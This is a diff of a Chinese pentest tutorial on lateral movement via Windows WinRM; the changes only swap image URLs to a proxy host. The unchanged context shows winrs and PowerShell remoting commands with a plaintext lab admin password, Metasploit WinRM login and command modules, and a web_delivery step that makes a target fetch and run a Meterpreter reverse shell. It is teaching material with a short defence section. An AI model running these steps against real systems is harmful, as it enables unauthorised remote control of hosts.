@@ -17,7 +17,7 @@ __
 
   
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145617.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145617.png)
 
 ## 前言
 
@@ -60,7 +60,7 @@ Windows 远程管理服务（WinRM）适用于 Windows Server 2008 和 Windows 7
     
     winrm e winrm/config/listener# 或 winrm enumerate winrm/config/listener
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145621.png)image-20210804153757275
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145621.png)image-20210804153757275
 
 如上图，有几个参数：
 
@@ -79,7 +79,7 @@ URLPrefix>`。默认 URL 前缀为
     
     winrm get winrm/config
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145622.png)image-20210804155451344
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145622.png)image-20210804155451344
 
 你可以使用以下命令启动 WinRM 服务，并对 WinRM 服务进行默认配置：
 
@@ -87,7 +87,7 @@ URLPrefix>`。默认 URL 前缀为
     
     winrm quickconfig
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145623.png)image-20210804160813342
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145623.png)image-20210804160813342
 
 该命令将执行以下这些操作：
 
@@ -127,7 +127,7 @@ WinRS 是 Windows 的远程 Shell，它相当于 WinRM 的客户端，使用它�
 
 执行后得到以下报错：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145624.png)image-20210804172346402
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145624.png)image-20210804172346402
 
 > Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于
 > TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts
@@ -141,7 +141,7 @@ WinRS 是 Windows 的远程 Shell，它相当于 WinRM 的客户端，使用它�
 
 然后便可以正常使用了：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145625.png)image-20210804172824608
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145625.png)image-20210804172824608
 
 如上图所示，成功在远程主机上执行命令。
 
@@ -153,11 +153,11 @@ WinRS 是 Windows 的远程 Shell，它相当于 WinRM 的客户端，使用它�
     
     winrm invoke create wmicimv2/win32_process -SkipCAcheck-skipCNcheck @{commandline="calc.exe"} -r:DC.whoamianony.org
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145626.png)image-20210804214149793
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145626.png)image-20210804214149793
 
 如下图所示，成功正在远程主机上启动了一个 calc 进程：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145630.png)image-20210804214037070
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145630.png)image-20210804214037070
 
 ### 使用 Invoke-Command 命令
 
@@ -170,7 +170,7 @@ Invoke-Command 是 PowerShell 上的一个命令，用来在本地或远程计�
 •-ComputerName：指定要连接的远程主机名或者
 IP。•-Credential：指定有权连接到远程计算机的用户的帐户。•-Command：指定需要执行的命令。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145631.png)image-20210804215420172
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145631.png)image-20210804215420172
 
 如上图所示，成功在远程主机上执行命令。
 
@@ -184,7 +184,7 @@ IP。•-Credential：指定有权连接到远程计算机的用户的帐户。�
     
     winrs -r:http://192.168.93.30:5985 -u:administrator -p:Whoami2021 cmd
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145632.png)image-20210804180229253
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145632.png)image-20210804180229253
 
 ### 使用 Enter-PSSession 命令
 
@@ -202,11 +202,11 @@ IP。•-Credential：指定有权连接到远程计算机的用户的帐户。�
 
 如下图所示，执行该命令后，成功启动了一个与远程主机的交互式会话，该会话的名称为 WinRM1：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145633.png)image-20210804174314450
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145633.png)image-20210804174314450
 
 执行 `Get-PSSession` 命令可以查看当前创建的所有会话：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145634.png)image-20210804175004739
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145634.png)image-20210804175004739
 
 此时，可以选中一个会话进入其交互模式执行命令，：
 
@@ -214,7 +214,7 @@ IP。•-Credential：指定有权连接到远程计算机的用户的帐户。�
     
     Enter-PSSession-NameWinRM1
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145635.png)image-20210804174607718
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145635.png)image-20210804174607718
 
 执行 `Exit-PSSession` 命令即可退出当前会话。
 
@@ -235,12 +235,12 @@ IP。•-Credential：指定有权连接到远程计算机的用户的帐户。�
 
 测试环境如下：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145637.png)image-20210804200655657
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145637.png)image-20210804200655657
 
 假设此时攻击者已经拿下了内网中的主机 Windows 10，需要继续以 Windows 10 为跳板进行横向移动来拿下 Windows Server
 2012，假设此时已经获取到了一个域管理员的登录凭据，并且通过端口扫描发现 Windows Server 2012 开启了 WinRM 服务：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145639.png)image-20210804212802935
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145639.png)image-20210804212802935
 
 下面我们尝试通过 WinRM 获取 Windows Server 2012 的控制权。
 
@@ -262,7 +262,7 @@ Metasploit 框架内置了多个模块，可用于发现启用了 WinRM 服务�
     
     use auxiliary/scanner/winrm/winrm_auth_methodsset DOMAIN whoamianonyset rhosts 192.168.93.30run
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145640.png)image-20210804211757503
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145640.png)image-20210804211757503
 
 如上图所示，发现远程主机 Windows Server 2012 开启了 WinRM 服务并且三种类型的身份验证都支持。
 
@@ -274,7 +274,7 @@ Metasploit 框架内置了多个模块，可用于发现启用了 WinRM 服务�
     
     use auxiliary/scanner/winrm/winrm_loginset DOMAIN whoamianonyset USERNAME administratorset PASSWORD Whoami2021set rhosts 192.168.93.30set rport 5985run
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145642.png)image-20210804211908907
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145642.png)image-20210804211908907
 
 如上图所示当前管理员凭据对目标主机 Windows Server 2012 是有效的。确定凭据有效后，我们开始尝试对目标主机 Windows Server
 2012 执行命令。
@@ -287,7 +287,7 @@ Metasploit 框架内置了多个模块，可用于发现启用了 WinRM 服务�
     
     use auxiliary/scanner/winrm/winrm_cmdset rhosts 192.168.93.30set DOMAIN whoamianonyset USERNAME administratorset PASSWORD Whoami2021set CMD ipconfig    # 设置需要执行的命令run
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145643.png)image-20210804210518981
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145643.png)image-20210804210518981
 
 •`exploit/windows/winrm/winrm_script_exec`
 
@@ -308,7 +308,7 @@ Meterpreter 会话。
     
     use exploit/multi/script/web_deliveryset target 2# 选择使用powershell类型的payloadset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.93.129set lport 4444exploit
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145645.png)image-20210804223331035
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145645.png)image-20210804223331035
 
 然后再在 Windows 10 的 Meterpreter Shell 中通过 winrs 对 Windows Server 2012 执行命令，获取一个
 交互的 Shell：
@@ -317,11 +317,11 @@ Meterpreter 会话。
     
     winrs -r:http://192.168.93.30:5985 -u:administrator -p:Whoami2021 cmd
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145646.png)image-20210804222907058
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145646.png)image-20210804222907058
 
 然后在 Windows Server 2012 的 Shell 中执行 Web_delivery 模块生成的 PowerShell 命令即可上线：
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145648.png)image-20210804223743878
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145648.png)image-20210804223743878
 
 ## 对于 WinRM 横向移动的防御
 
@@ -332,7 +332,7 @@ Meterpreter 会话。
 
 ## Ending......
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145649.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145649.png)
 
  **推荐阅读：**
 
@@ -351,7 +351,7 @@ Meterpreter 会话。
 
 原创投稿作者：WHOAMI  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210915145651.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210915145651.png)
 
 预览时标签不可点
 
